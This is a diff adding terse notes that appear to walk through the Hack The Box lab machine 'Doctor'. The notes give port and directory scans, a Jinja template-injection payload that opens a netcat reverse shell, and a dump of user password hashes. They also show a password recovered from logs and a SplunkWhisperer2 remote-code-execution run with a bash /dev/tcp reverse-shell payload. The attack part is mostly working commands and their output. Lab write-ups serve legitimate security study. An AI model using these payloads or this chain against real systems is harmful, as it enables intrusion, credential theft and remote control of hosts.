@@ -1,0 +1,152 @@
+22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 59:4d:4e:c2:d8:cf:da:9d:a8:c8:d0:fd:99:a8:46:17 (RSA)
+|   256 7f:f3:dc:fb:2d:af:cb:ff:99:34:ac:e0:f8:00:1e:47 (ECDSA)
+|_  256 53:0e:96:6b:9c:e9:c1:a1:70:51:6c:2d:ce:7b:43:e8 (ED25519)
+80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Doctor
+8089/tcp open  ssl/http Splunkd httpd
+|_http-server-header: Splunkd
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-title: splunkd
+| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
+| Not valid before: 2020-09-06T15:57:27
+|_Not valid after:  2023-09-06T15:57:27
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+└─$ sudo dirsearch -u https://10.10.10.209:8089
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Output File: /home/ed/reports/https_10.10.10.209_8089/_25-11-20_16-28-00.txt
+
+Target: https://10.10.10.209:8089/
+
+[16:28:00] Starting: 
+[16:28:49] 200 -   26B  - /robots.txt
+[16:28:49] 404 -   15B  - /rpc/
+[16:28:50] 401 -  130B  - /services/
+[16:28:50] 401 -  130B  - /services
+[16:28:50] 401 -  130B  - /services/config/databases.yml
+
+
+
+└─$ gobuster dir --url http://doctors.htb  -w=/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt   -t 111
+===============================================================
+Gobuster v3.8
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://doctors.htb
+[+] Method:                  GET
+[+] Threads:                 111
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/account              (Status: 302) [Size: 251] [--> http://doctors.htb/login?next=%2Faccount]
+/login                (Status: 200) [Size: 4204]
+/home                 (Status: 302) [Size: 245] [--> http://doctors.htb/login?next=%2Fhome]
+/register             (Status: 200) [Size: 4493]
+/archive              (Status: 200) [Size: 101]
+/logout               (Status: 302) [Size: 217] [--> http://doctors.htb/home]
+/reset_password       (Status: 200) [Size: 3493]
+/server-status        (Status: 403) [Size: 276]
+Progress: 220557 / 220557 (100.00%)
+======================================================
+
+//test SSTI by {{7*7}}
+
+{{request.application.__globals__.__builtins__.__import__('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.16 8821 >/tmp/f').read()}}
+
+//access it at http://doctors.htb/archive
+
+python3 -c "import pty;pty.spawn('/bin/bash')"
+
+
+
+web@doctor:~/blog/flaskblog$ cat site.db
+
+=�=��wd\a@a.coma@a.comdefault.gif$2b$12$ed8Kaq6mmK1uC2VzGjp2AOyaPSuLJE8w191HCM94zdkfvarTa8r3qc-#�
+adminadmin@doctor.htbdefault.gif$2b$12$Tg2b8u/elwAyfQOvqvxJgOTcsbnkFANIDdv6jVXmxiWsg4IznjI0S
+����#	TestUse
+
+sqlite3 site.db 
+SQLite version 3.33.0 2020-08-14 13:23:32
+Enter ".help" for usage hints.
+sqlite> select * from user;
+1|admin|admin@doctor.htb|default.gif|$2b$12$Tg2b8u/elwAyfQOvqvxJgOTcsbnkFANIDdv6jVXmxiWsg4IznjI0S
+2|shaun|s@s.com|default.gif|$2b$12$wW0SocwtbEImnxgWoHJPMOzbTKs1qYCeE5Q0KnBtCXqD7NzuDne4y
+
+
+/usr/bin/python3.8 = cap_sys_ptrace+ep
+
+╔══════════╣ Searching passwords inside logs (limit 70)
+Binary file /var/log/apache2/access.log.12.gz matches
+Binary file /var/log/journal/62307f5876ce4bdeb1a4be33bebfb978/system.journal matches
+Binary file /var/log/journal/62307f5876ce4bdeb1a4be33bebfb978/user-1001.journal matches
+Binary file /var/log/kern.log.2.gz matches
+Binary file /var/log/kern.log.4.gz matches
+Binary file /var/log/syslog.4.gz matches
+/var/log/apache2/backup:10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"
+/var/log/auth.log.1:Sep 22 13:01:23 doctor sshd[1704]: Failed password for invalid user shaun from 10.10.14.2 port 40896 ssh2
+/var/log/auth.log.1:Sep 22 13:01:28 doctor sshd[1704]: Failed password for invalid user shaun from 10.10.14.2 port 40896 ssh2
+
+web@doctor:/tmp$ su shaun
+su shaun
+Password: Guitar123
+
+shaun@doctor:/tmp$ id
+id
+uid=1002(shaun) gid=1002(shaun) groups=1002(shaun)
+
+ps -aux | grep splunk
+root        1131  0.0  2.3 263872 93848 ?        Sl   06:52   0:01 splunkd -p 8089 start
+root        1133  0.0  0.3  77664 13432 ?        Ss   06:52   0:00 [splunkd pid=1131] splunkd -p 8089 start [process-runner]
+
+
+//and we can use shaun's credential to login into splunk web services
+
+https://github.com/cnotin/SplunkWhisperer2/
+Local privilege escalation, or remote code execution, through Splunk Universal Forwarder (UF) misconfigurations. 
+
+
+
+Remote Code Execution (RCE): the Universal Forwarder is exposed, then use PySplunkWhisperer2_remote.py. The following arguments exist. They are all optional, except --host and --lhost:
+
+    --scheme, default="https"
+    --host, required=True, this is your target
+    --port, default=8089
+    --lhost, required=True, this is your own IP
+    --lport, default=8181
+    --username, default="admin"
+    --password, default="changeme" (note: this default password does not work remotely by default)
+    --payload, default="calc.exe", you must adapt for Linux targets
+    --payload-file, default="pwn.bat", you must adapt for Linux targets The app bundle is created on your computer (temp file) and Splunk fetches it through HTTP (hence the need for --lhost).
+
+
+└─$ python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --port 8089 --lhost 10.10.16.16  --username shaun --password Guitar123 --payload "bash -c 'bash -i >& /dev/tcp/10.10.16.16/443 0>&1'" 
+Running in remote mode (Remote Code Execution)
+[.] Authenticating...
+[+] Authenticated
+[.] Creating malicious app bundle...
+[+] Created malicious app bundle in: /tmp/tmpskso8lp8.tar
+[+] Started HTTP server for remote mode
+[.] Installing app from: http://10.10.16.16:8181/
+10.10.10.209 - - [20/Nov/2025 18:46:31] "GET / HTTP/1.1" 200 -
+[+] App installed, your code should be running now!
+
+Press RETURN to cleanup
+
+
+
